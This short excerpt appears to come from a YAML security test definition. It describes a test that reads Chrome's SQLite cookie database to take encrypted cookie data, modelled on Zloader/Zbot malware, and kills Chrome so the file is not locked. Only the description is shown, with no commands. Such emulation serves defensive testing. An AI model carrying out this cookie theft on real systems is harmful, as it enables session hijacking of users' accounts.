- description: "This test queries Chrome's SQLite database to steal the encrypted\
    \ cookie data, designed to function similarly to Zloader/Zbot's cookie theft function.\
    \ \nOnce an adversary obtains the encrypted cookie info, they could go on to decrypt\
    \ the encrypted value, potentially allowing for session theft. \nNote: If Chrome\
    \ is running, the process will be killed to ensure that the DB file isn't locked.\
    \ \nSee https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf.\
